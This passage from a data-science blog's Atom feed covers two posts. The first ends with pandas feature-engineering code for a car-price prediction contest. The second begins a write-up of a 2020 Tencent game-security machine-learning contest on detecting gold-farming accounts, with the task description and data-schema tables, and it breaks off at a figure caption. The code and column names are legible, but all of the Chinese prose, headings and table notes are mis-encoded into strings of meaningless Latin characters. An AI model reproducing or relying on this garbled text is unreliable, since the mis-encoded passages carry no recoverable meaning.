df_feature.groupby([&#39;name&#39;])[&#39;SaleID&#39;].transform(&#39;count&#39;)</span><br></pre></td></tr></table></figure><p>æ•°å€¼ç‰¹å¾å¾€å¾€ç»“åˆç±»åˆ«ç‰¹å¾è¿›è¡Œç»Ÿè®¡ã€‚æ¯”å¦‚å¯ä»¥ç»Ÿè®¡ä¸åŒæ±½è½¦å“ç‰Œä¸‹åŒ¿åç‰¹å¾çš„ç»Ÿè®¡ç‰¹å¾ï¼šmean, std, max, minã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l &#x3D; [&#39;name&#39;, &#39;model&#39;, &#39;brand&#39;, &#39;bodyType&#39;]</span><br><span class="line">for f1 in tqdm(l):</span><br><span class="line">    for f2 in v_cols:</span><br><span class="line">        df_feature &#x3D; stat(df_feature, df_feature, [f1], &#123;</span><br><span class="line">            f2: [&#39;mean&#39;, &#39;max&#39;, &#39;min&#39;, &#39;std&#39;]&#125;)</span><br></pre></td></tr></table></figure><p>ç›®æ ‡å˜é‡ price ä¹Ÿæ˜¯æ•°å€¼ç‰¹å¾ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç»“åˆç±»åˆ«è¿›è¡Œç»Ÿè®¡ï¼Œæ¯”å¦‚è®¡ç®—æŸå“ç‰Œï¼ŒæŸè½¦å‹çš„å¹³å‡äº¤æ˜“ä»·æ ¼ï¼Œè¿™ç§åšæ³•ç§°ä¸ºç›®æ ‡ç¼–ç ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‡å¦‚ä½¿ç”¨å…¨å±€æ ‡ç­¾ä¿¡æ¯ç»Ÿè®¡ä¼šå‡ºç°æ ‡ç­¾æ³„éœ²çš„é—®é¢˜ï¼Œæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨äº”æŠ˜ç»Ÿè®¡æ³•ï¼Œç”¨å››æŠ˜çš„æ ‡ç­¾æ•°æ®åšç»Ÿè®¡ç»™å¦å¤–ä¸€æŠ˜çš„æ•°æ®åšç‰¹å¾ã€‚</p><h2 id="åŒ¿åç‰¹å¾"><a href="#åŒ¿åç‰¹å¾" class="headerlink" title="åŒ¿åç‰¹å¾"></a>åŒ¿åç‰¹å¾</h2><p>ç®€å•ä¸€ç‚¹ï¼Œå¯ä»¥ç›´æ¥ç»Ÿè®¡æ¯è¾†è½¦15ä¸ªåŒ¿åç‰¹å¾çš„ç»Ÿè®¡å€¼ï¼Œå¾—åˆ°v_meanï¼Œv_maxï¼Œv_minå’Œv_stdã€‚ç„¶åå†ç»Ÿè®¡æ±½è½¦äº¤æ˜“åç§°ä¸‹è¿™å››ä¸ªç‰¹å¾çš„ç»Ÿè®¡å€¼ï¼Œè¿™é“é¢˜ï¼Œæ±½è½¦äº¤æ˜“åç§°ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹å¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v_cols &#x3D; [&#39;v_&#39;+str(i) for i in range(15)]</span><br><span class="line"></span><br><span class="line">df_feature[&#39;v_mean&#39;] &#x3D; df_feature[v_cols].mean(axis&#x3D;1)</span><br><span class="line">df_feature[&#39;v_max&#39;] &#x3D; df_feature[v_cols].max(axis&#x3D;1)</span><br><span class="line">df_feature[&#39;v_min&#39;] &#x3D; df_feature[v_cols].min(axis&#x3D;1)</span><br><span class="line">df_feature[&#39;v_std&#39;] &#x3D; df_feature[v_cols].std(axis&#x3D;1)</span><br><span class="line"></span><br><span class="line">for col in [&#39;v_mean&#39;, &#39;v_max&#39;, &#39;v_min&#39;, &#39;v_std&#39;]:</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_mean&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;mean&#39;)</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_std&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;std&#39;)</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_max&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;max&#39;)</span><br><span class="line">    df_feature[f&#39;name_&#123;col&#125;_min&#39;] &#x3D; df_feature.groupby(&#39;name&#39;)[</span><br><span class="line">        col].transform(&#39;min&#39;)</span><br></pre></td></tr></table></figure><p>åŒ¿åç‰¹å¾æ— æ³•çŸ¥é“å…·ä½“çš„ä¸šåŠ¡å«ä¹‰ï¼Œæ‰€ä»¥åªèƒ½æ¢­å“ˆæ“ä½œï¼Œå†™äº†ä¸ªç¨‹åºå¯¹åŒ¿åç‰¹å¾è¿›è¡ŒäºŒé˜¶æˆ–ä¸‰é˜¶ç»„åˆï¼Œè®¡ç®—ç›¸åŠ å’Œç›¸å‡ï¼Œæœ€åç­›é€‰ä¿ç•™ä»¥ä¸‹ç‰¹å¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">df_feature[&#39;v_0_add_v_4&#39;] &#x3D; df_feature[&#39;v_0&#39;] + df_feature[&#39;v_4&#39;]</span><br><span class="line">df_feature[&#39;v_0_add_v_8&#39;] &#x3D; df_feature[&#39;v_0&#39;] + df_feature[&#39;v_8&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_3&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_3&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_4&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_4&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_5&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_5&#39;]</span><br><span class="line">df_feature[&#39;v_1_add_v_12&#39;] &#x3D; df_feature[&#39;v_1&#39;] + df_feature[&#39;v_12&#39;]</span><br><span class="line">df_feature[&#39;v_2_add_v_3&#39;] &#x3D; df_feature[&#39;v_2&#39;] + df_feature[&#39;v_3&#39;]</span><br><span class="line">df_feature[&#39;v_4_add_v_11&#39;] &#x3D; df_feature[&#39;v_4&#39;] + df_feature[&#39;v_11&#39;]</span><br><span class="line">df_feature[&#39;v_4_add_v_12&#39;] &#x3D; df_feature[&#39;v_4&#39;] + df_feature[&#39;v_12&#39;]</span><br><span class="line">df_feature[&#39;v_0_add_v_12_add_v_14&#39;] &#x3D; df_feature[&#39;v_0&#39;] + \</span><br><span class="line">    df_feature[&#39;v_12&#39;] + df_feature[&#39;v_14&#39;]</span><br><span class="line"></span><br><span class="line">df_feature[&#39;v_4_add_v_9_minu_v_13&#39;] &#x3D; df_feature[&#39;v_4&#39;] + \</span><br><span class="line">    df_feature[&#39;v_9&#39;] - df_feature[&#39;v_13&#39;]</span><br><span class="line">df_feature[&#39;v_2_add_v_4_minu_v_11&#39;] &#x3D; df_feature[&#39;v_2&#39;] + \</span><br><span class="line">    df_feature[&#39;v_4&#39;] - df_feature[&#39;v_11&#39;]</span><br><span class="line">df_feature[&#39;v_2_add_v_3_minu_v_11&#39;] &#x3D; df_feature[&#39;v_2&#39;] + \</span><br><span class="line">    df_feature[&#39;v_3&#39;] - df_feature[&#39;v_11&#39;]</span><br></pre></td></tr></table></figure><h2 id="å°è¯•è¿‡çš„æ— ç”¨ç‰¹å¾"><a href="#å°è¯•è¿‡çš„æ— ç”¨ç‰¹å¾" class="headerlink" title="å°è¯•è¿‡çš„æ— ç”¨ç‰¹å¾"></a>å°è¯•è¿‡çš„æ— ç”¨ç‰¹å¾</h2><p>è®ºå›åˆ†äº«äº†ä¸å°‘ç»“åˆä¸šåŠ¡çš„ç‰¹å¾ï¼Œä½†æˆ‘è‡ªå·±å°è¯•åå‘ç°æ•ˆæœéƒ½ä¸è¡Œï¼Œè¿™ä¹Ÿæ˜¯è®©æˆ‘å¾ˆå›°æƒ‘çš„åœ°æ–¹ã€‚å®˜æ–¹èµ›é¢˜åˆ†äº«æåˆ°å¯ä»¥æˆªå–regionCodeï¼Œæå–åŸå¸‚ä¿¡æ¯ï¼Œä½† regionCode å·²ç»è¢«ç¼–ç è„±æ•æˆ0~8121çš„æ•°å­—ï¼Œå·²ç»æ— æ³•è¿›è¡Œä¿¡æ¯æå–ã€‚</p><h1 id="æ¨¡å‹"><a href="#æ¨¡å‹" class="headerlink" title="æ¨¡å‹"></a>æ¨¡å‹</h1><p>ä¸¤ä¸ªæ ‘æ¨¡å‹ï¼šlgb å’Œ xgb åˆ†åˆ«é¢„æµ‹ï¼Œç„¶åæ ¹æ®å¾—åˆ†è¿›è¡Œç®€å•çš„åŠ æƒï¼ŒæŒ‰ç…§ 0.45*xgb_pred+0.55 *lgb_pred å¾—åˆ°æœ€åçš„æ±½è½¦é¢„æµ‹ä»·æ ¼ã€‚æœ€åçº¿ä¸Šå¾—åˆ†433ï¼Œrankï¼š62 / 2776ã€‚</p>]]></content>
        <author>
            <name><![CDATA[LogicJakeâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/04/16/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BB%84-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[2020è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ›æœºå™¨å­¦ä¹ ç»„-èµ›åæ€»ç»“]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/04/16/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BB%84-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/04/16/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BB%84-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>æœ€ç»ˆæˆç»©ï¼šä¼˜èƒœå¥–ï¼ˆTOP 4ï¼‰<br>æ¯”èµ›åœ°å€ï¼š<a href="https://gslab.qq.com/html/competition/2020/index.htm" target="_blank" rel="noopener">https://gslab.qq.com/html/competition/2020/index.htm</a><br>æºç ï¼š<a href="https://github.com/LogicJake/2020-gslab-ml-top4" target="_blank" rel="noopener">https://github.com/LogicJake/2020-gslab-ml-top4</a></p><h1 id="èµ›é¢˜èƒŒæ™¯"><a href="#èµ›é¢˜èƒŒæ™¯" class="headerlink" title="èµ›é¢˜èƒŒæ™¯"></a>èµ›é¢˜èƒŒæ™¯</h1><p>åœ¨æ¸¸æˆä¸­ï¼Œæœ‰ä¸€äº›äººæˆ–ç»„ç»‡ï¼Œé€šè¿‡éæ³•æ‰‹æ®µè·å–å¤§é‡æ¸¸æˆå†…é‡‘å¸ç‰©å“ç­‰èµ„æºï¼Œè¿™å°±æ˜¯æ‰“é‡‘å·¥ä½œå®¤ï¼ˆGold Farmingï¼‰ã€‚ä»–ä»¬ä¸€èˆ¬æ‹¥æœ‰å¤§é‡å¸å·ï¼Œä½¿ç”¨å¤–æŒ‚æˆ–æŒ‚æœºè½¯ä»¶æ‰¹é‡è¿›è¡Œæ¸¸æˆè¡Œä¸ºï¼Œç ´åæ¸¸æˆç»æµç³»ç»Ÿï¼Œå½±å“ç©å®¶æ¸¸æˆä½“éªŒã€‚å¯è‡ªè¡Œæœç´¢æ‰“é‡‘å·¥ä½œå®¤ç›¸å…³èµ„æ–™ï¼Œäº†è§£ä»–ä»¬æ˜¯å¦‚ä½•è¿ä½œï¼Œæ¸¸æˆæ–¹å¦‚ä½•æ‰“å‡»ï¼Œä»–ä»¬åˆæ˜¯å¦‚ä½•é€ƒé¿æ‰“å‡»çš„ã€‚</p><h2 id="ç«èµ›ç›®æ ‡"><a href="#ç«èµ›ç›®æ ‡" class="headerlink" title="ç«èµ›ç›®æ ‡"></a>ç«èµ›ç›®æ ‡</h2><p>ä½¿ç”¨ 2020å¹´03æœˆ01æ—¥çš„æ•°æ®(å«æ ‡ç­¾) æ¥è®­ç»ƒè¯†åˆ«æ‰“é‡‘å·¥ä½œå®¤çš„æ¨¡å‹ã€‚ç”¨æ­¤æ¨¡å‹, é¢„æµ‹2020å¹´03æœˆ05æ—¥çš„æ‰“é‡‘å·¥ä½œå®¤ã€‚å–å½“æ—¥loginæˆ–logoutä¸­å‡ºç°è¿‡çš„å¸å·ï¼Œåˆ¤æ–­è¿™äº›å¸å·ä¸­å“ªäº›æ˜¯æ‰“é‡‘å·¥ä½œå®¤ã€‚</p><h2 id="è¡¡é‡æ ‡å‡†"><a href="#è¡¡é‡æ ‡å‡†" class="headerlink" title="è¡¡é‡æ ‡å‡†"></a>è¡¡é‡æ ‡å‡†</h2><p>å¾—åˆ† = 4PR / (P+3R)</p><p>Pä¸ºå‡†ç¡®åº¦, å³æäº¤ç»“æœæœ‰å¤šå¤§æ¯”ç‡æ˜¯çœŸæ­£çš„å·¥ä½œå®¤<br>Rä¸ºè¦†ç›–ç‡, å³æäº¤ç»“æœè¦†ç›–äº†å…¨ä½“å·¥ä½œå®¤çš„æ¯”ç‡</p><a id="more"></a><h1 id="æ•°æ®è¯´æ˜"><a href="#æ•°æ®è¯´æ˜" class="headerlink" title="æ•°æ®è¯´æ˜"></a>æ•°æ®è¯´æ˜</h1><p>æ•°æ®æ¥è‡ªæŸMMORPG(å¤§å‹å¤šäººåœ¨çº¿è§’è‰²æ‰®æ¼”æ¸¸æˆ), å¹¶ç»è¿‡è„±æ•å¤„ç†</p><ul><li>æ—¥æœŸ<ul><li>2020å¹´03æœˆ01æ—¥çš„æ•°æ®(å«æ ‡ç­¾) ä¸ºè®­ç»ƒé›†</li><li>2020å¹´03æœˆ05æ—¥çš„æ•°æ®ä¸ºæµ‹è¯•é›†</li></ul></li><li>åŸºç¡€çŸ¥è¯†<ul><li>uin: å”¯ä¸€æ ‡è¯†æ¸¸æˆå†…çš„ä¸€ä¸ªç”¨æˆ·, æ¯”å¦‚ä½ çš„qqæˆ–å¾®ä¿¡</li><li>roleid: ä¸€ä¸ªuinå¯èƒ½æœ‰å¤šä¸ªè§’è‰²</li></ul></li><li>å­˜å‚¨æ ¼å¼<ul><li>æ–‡ä»¶åä¸º: å¹´æœˆæ—¥.txt</li><li>ä»¥æ–‡æœ¬å­˜å‚¨</li><li>ä»¥ç«–çº¿|åˆ†éš”</li><li>ç©º æˆ– \N è¡¨ç¤ºæ•°æ®ç¼ºå¤±</li></ul></li><li>ç›®å½•è¯´æ˜<ul><li>label_black é»‘æ ‡ç­¾: æ‰“é‡‘å·¥ä½œå®¤å¸å·</li><li>label_white ç™½æ ‡ç­¾: éæ‰“é‡‘å·¥ä½œå®¤å¸å·</li><li>role_login è§’è‰²ç™»å…¥æ¸¸æˆ</li><li>role_logout è§’è‰²ç™»å‡ºæ¸¸æˆ</li><li>role_create åˆ›å»ºæ–°è§’è‰²</li><li>uin_chat æŒ‰å¤©ç»Ÿè®¡çš„å¸å·å‘è¨€æ¬¡æ•°</li><li>ä»¥ä¸‹æ•°æ®ä»…åœ¨å†³èµ›æ—¶æä¾›<ul><li>role_moneyflow è§’è‰²çš„è¯¦ç»†é‡‘é’±æµæ°´ä¿¡æ¯(å½“å¤©æŒ‰æ—¶é—´é¡ºåºå‰300æ¡è®°å½•)</li><li>role_itemflow è§’è‰²çš„è¯¦ç»†ç‰©å“æµæ°´ä¿¡æ¯(å½“å¤©æŒ‰æ—¶é—´é¡ºåºå‰300æ¡è®°å½•)</li></ul></li></ul></li></ul><h2 id="role-login-è§’è‰²ç™»å…¥æ¸¸æˆ"><a href="#role-login-è§’è‰²ç™»å…¥æ¸¸æˆ" class="headerlink" title="role_login è§’è‰²ç™»å…¥æ¸¸æˆ"></a>role_login è§’è‰²ç™»å…¥æ¸¸æˆ</h2><table><thead><tr><th align="center">#</th><th align="center">åˆ—å</th><th align="center">ç±»å‹</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">æ—¶é—´,æ ¼å¼YYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">platid</td><td align="center">BIGINT</td><td align="center">ios=0/android=1</td></tr><tr><td align="center">3</td><td align="center">areaid</td><td align="center">BIGINT</td><td align="center">å¾®ä¿¡=1/æ‰‹Q=2/æ¸¸å®¢=3</td></tr><tr><td align="center">4</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">æ¸¸æˆå°åŒº(å·²åŠ å¯†)</td></tr><tr><td align="center">5</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(å·²åŠ å¯†)</td></tr><tr><td align="center">6</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">è§’è‰²id(å·²åŠ å¯†)</td></tr><tr><td align="center">7</td><td align="center">rolename</td><td align="center">STRING</td><td align="center">è§’è‰²å(å·²ç½®ç©º)</td></tr><tr><td align="center">8</td><td align="center">job</td><td align="center">STRING</td><td align="center">èŒä¸š</td></tr><tr><td align="center">9</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">ç­‰çº§</td></tr><tr><td align="center">10</td><td align="center">power</td><td align="center">BIGINT</td><td align="center">æˆ˜åŠ›</td></tr><tr><td align="center">11</td><td align="center">friendsnum</td><td align="center">BIGINT</td><td align="center">å¥½å‹æ•°é‡</td></tr><tr><td align="center">12</td><td align="center">network</td><td align="center">STRING</td><td align="center">3G/WIFI/2G/NULL</td></tr><tr><td align="center">13</td><td align="center">clientip</td><td align="center">STRING</td><td align="center">å®¢æˆ·ç«¯IP(å·²åŠ å¯†)</td></tr><tr><td align="center">14</td><td align="center">deviceid</td><td align="center">STRING</td><td align="center">è®¾å¤‡ID(å·²åŠ å¯†)</td></tr></tbody></table><h2 id="role-logout-è§’è‰²ç™»å‡ºæ¸¸æˆ"><a href="#role-logout-è§’è‰²ç™»å‡ºæ¸¸æˆ" class="headerlink" title="role_logout è§’è‰²ç™»å‡ºæ¸¸æˆ"></a>role_logout è§’è‰²ç™»å‡ºæ¸¸æˆ</h2><table><thead><tr><th align="center">#</th><th align="center">åˆ—å</th><th align="center">ç±»å‹</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">æ—¶é—´,æ ¼å¼YYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">platid</td><td align="center">BIGINT</td><td align="center">ios=0/android=1</td></tr><tr><td align="center">3</td><td align="center">areaid</td><td align="center">BIGINT</td><td align="center">å¾®ä¿¡=1/æ‰‹Q=2/æ¸¸å®¢=3</td></tr><tr><td align="center">4</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">æ¸¸æˆå°åŒº(å·²åŠ å¯†)</td></tr><tr><td align="center">5</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(å·²åŠ å¯†)</td></tr><tr><td align="center">6</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">è§’è‰²id(å·²åŠ å¯†)</td></tr><tr><td align="center">7</td><td align="center">rolename</td><td align="center">STRING</td><td align="center">è§’è‰²å(å·²ç½®ç©º)</td></tr><tr><td align="center">8</td><td align="center">job</td><td align="center">STRING</td><td align="center">èŒä¸š</td></tr><tr><td align="center">9</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">ç­‰çº§</td></tr><tr><td align="center">10</td><td align="center">power</td><td align="center">BIGINT</td><td align="center">æˆ˜åŠ›</td></tr><tr><td align="center">11</td><td align="center">friendsnum</td><td align="center">BIGINT</td><td align="center">å¥½å‹æ•°é‡</td></tr><tr><td align="center">12</td><td align="center">network</td><td align="center">STRING</td><td align="center">3G/WIFI/2G/NULL</td></tr><tr><td align="center">13</td><td align="center">clientip</td><td align="center">STRING</td><td align="center">å®¢æˆ·ç«¯IP(å·²åŠ å¯†)</td></tr><tr><td align="center">14</td><td align="center">deviceid</td><td align="center">STRING</td><td align="center">è®¾å¤‡ID(å·²åŠ å¯†)</td></tr><tr><td align="center">15</td><td align="center">onlinetime</td><td align="center">BIGINT</td><td align="center">åœ¨çº¿æ—¶é•¿(ç§’)</td></tr></tbody></table><h2 id="role-create-åˆ›å»ºæ–°è§’è‰²"><a href="#role-create-åˆ›å»ºæ–°è§’è‰²" class="headerlink" title="role_create åˆ›å»ºæ–°è§’è‰²"></a>role_create åˆ›å»ºæ–°è§’è‰²</h2><table><thead><tr><th align="center">#</th><th align="center">åˆ—å</th><th align="center">ç±»å‹</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">YYYY-MM-DD HH#MM#SS</td></tr><tr><td align="center">2</td><td align="center">platid</td><td align="center">BIGINT</td><td align="center">ios=0/android=1</td></tr><tr><td align="center">3</td><td align="center">areaid</td><td align="center">BIGINT</td><td align="center">å¾®ä¿¡=1/æ‰‹Q=2/æ¸¸å®¢=3</td></tr><tr><td align="center">4</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">æ¸¸æˆå°åŒº(å·²åŠ å¯†)</td></tr><tr><td align="center">5</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(å·²åŠ å¯†)</td></tr><tr><td align="center">6</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">è§’è‰²id(å·²åŠ å¯†)</td></tr><tr><td align="center">7</td><td align="center">rolename</td><td align="center">STRING</td><td align="center">è§’è‰²å(å·²ç½®ç©º)</td></tr><tr><td align="center">8</td><td align="center">job</td><td align="center">STRING</td><td align="center">èŒä¸š</td></tr><tr><td align="center">9</td><td align="center">regchannel</td><td align="center">STRING</td><td align="center">æ³¨å†Œæ¸ é“</td></tr><tr><td align="center">10</td><td align="center">network</td><td align="center">STRING</td><td align="center">3G/WIFI/2G</td></tr><tr><td align="center">11</td><td align="center">clientip</td><td align="center">STRING</td><td align="center">å®¢æˆ·ç«¯IP(å·²åŠ å¯†)</td></tr><tr><td align="center">12</td><td align="center">deviceid</td><td align="center">STRING</td><td align="center">è®¾å¤‡ID(å·²åŠ å¯†)</td></tr></tbody></table><h2 id="uin-chat-æŒ‰å¤©ç»Ÿè®¡çš„å¸å·å‘è¨€æ¬¡æ•°"><a href="#uin-chat-æŒ‰å¤©ç»Ÿè®¡çš„å¸å·å‘è¨€æ¬¡æ•°" class="headerlink" title="uin_chat æŒ‰å¤©ç»Ÿè®¡çš„å¸å·å‘è¨€æ¬¡æ•°"></a>uin_chat æŒ‰å¤©ç»Ÿè®¡çš„å¸å·å‘è¨€æ¬¡æ•°</h2><table><thead><tr><th align="center">#</th><th align="center">åˆ—å</th><th align="center">ç±»å‹</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(å·²åŠ å¯†)</td></tr><tr><td align="center">2</td><td align="center">chat_cnt</td><td align="center">BIGINT</td><td align="center">å‘è¨€æ¡æ•°</td></tr></tbody></table><h2 id="role-moneyflow-å¸å·çš„è¯¦ç»†é‡‘é’±æµæ°´ä¿¡æ¯"><a href="#role-moneyflow-å¸å·çš„è¯¦ç»†é‡‘é’±æµæ°´ä¿¡æ¯" class="headerlink" title="role_moneyflow å¸å·çš„è¯¦ç»†é‡‘é’±æµæ°´ä¿¡æ¯"></a>role_moneyflow å¸å·çš„è¯¦ç»†é‡‘é’±æµæ°´ä¿¡æ¯</h2><table><thead><tr><th align="center">#</th><th align="center">åˆ—å</th><th align="center">ç±»å‹</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">æ—¶é—´,æ ¼å¼YYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">æ¸¸æˆå°åŒº(å·²åŠ å¯†)</td></tr><tr><td align="center">3</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(å·²åŠ å¯†)</td></tr><tr><td align="center">4</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">è§’è‰²id(å·²åŠ å¯†)</td></tr><tr><td align="center">5</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">ç­‰çº§</td></tr><tr><td align="center">6</td><td align="center">iMoneyType</td><td align="center">STRING</td><td align="center">è´§å¸ç±»å‹</td></tr><tr><td align="center">7</td><td align="center">iMoney</td><td align="center">BIGINT</td><td align="center">è´§å¸å˜åŒ–æ•°</td></tr><tr><td align="center">8</td><td align="center">AfterMoney</td><td align="center">BIGINT</td><td align="center">åŠ¨ä½œåçš„è´§å¸å­˜é‡</td></tr><tr><td align="center">9</td><td align="center">AddOrReduce</td><td align="center">BIGINT</td><td align="center">è´§å¸å¢åŠ  0/å‡å°‘ 1</td></tr><tr><td align="center">10</td><td align="center">Reason</td><td align="center">STRING</td><td align="center">è´§å¸æµåŠ¨ä¸€çº§åŸå› </td></tr><tr><td align="center">11</td><td align="center">SubReason</td><td align="center">STRING</td><td align="center">è´§å¸æµåŠ¨äºŒçº§åŸå› </td></tr></tbody></table><h2 id="role-itemflow-å¸å·çš„è¯¦ç»†ç‰©å“æµæ°´ä¿¡æ¯"><a href="#role-itemflow-å¸å·çš„è¯¦ç»†ç‰©å“æµæ°´ä¿¡æ¯" class="headerlink" title="role_itemflow å¸å·çš„è¯¦ç»†ç‰©å“æµæ°´ä¿¡æ¯"></a>role_itemflow å¸å·çš„è¯¦ç»†ç‰©å“æµæ°´ä¿¡æ¯</h2><table><thead><tr><th align="center">#</th><th align="center">åˆ—å</th><th align="center">ç±»å‹</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">æ—¶é—´,æ ¼å¼YYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">æ¸¸æˆå°åŒº(å·²åŠ å¯†)</td></tr><tr><td align="center">3</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(å·²åŠ å¯†)</td></tr><tr><td align="center">4</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">è§’è‰²id(å·²åŠ å¯†)</td></tr><tr><td align="center">5</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">ç­‰çº§</td></tr><tr><td align="center">6</td><td align="center">Itemtype</td><td align="center">STRING</td><td align="center">é“å…·ç±»å‹</td></tr><tr><td align="center">7</td><td align="center">Itemid</td><td align="center">STRING</td><td align="center">é“å…·ID</td></tr><tr><td align="center">8</td><td align="center">Count</td><td align="center">BIGINT</td><td align="center">é“å…·å˜åŠ¨æ•°é‡</td></tr><tr><td align="center">9</td><td align="center">Aftercount</td><td align="center">BIGINT</td><td align="center">åŠ¨ä½œåé“å…·å‰©ä½™æ•°é‡</td></tr><tr><td align="center">10</td><td align="center">Addorreduce</td><td align="center">BIGINT</td><td align="center">å¢åŠ  0/å‡å°‘ 1</td></tr><tr><td align="center">11</td><td align="center">Reason</td><td align="center">STRING</td><td align="center">é“å…·æµåŠ¨ä¸€çº§åŸå› </td></tr><tr><td align="center">12</td><td align="center">SubReason</td><td align="center">STRING</td><td align="center">é“å…·æµåŠ¨äºŒçº§åŸå› </td></tr></tbody></table><h1 id="ç®€å•-eda"><a href="#ç®€å•-eda" class="headerlink" title="ç®€å• eda"></a>ç®€å• eda</h1><p>è®­ç»ƒé›†æ€»è´¦æˆ·æ•°ä¸º74704ï¼Œå…¶ä¸­æ‰“é‡‘å·¥ä½œå®¤è´¦æˆ·10202ï¼Œæ­£å¸¸ç”¨æˆ·64502ï¼Œæ­£è´Ÿæ ·æœ¬åˆ†å¸ƒä¸å‡åŒ€ã€‚ç™»å…¥æ•°æ®çš„ç¦»æ•£æ•°æ®ç»Ÿè®¡ä¿¡æ¯å¦‚å›¾1æ‰€ç¤ºã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_1.png" alt="å›¾1 ç™»å…¥æ•°æ®çš„ç¦»æ•£æ•°æ®ç»Ÿè®¡" title="">                </div>                <div class="image-caption">å›¾1 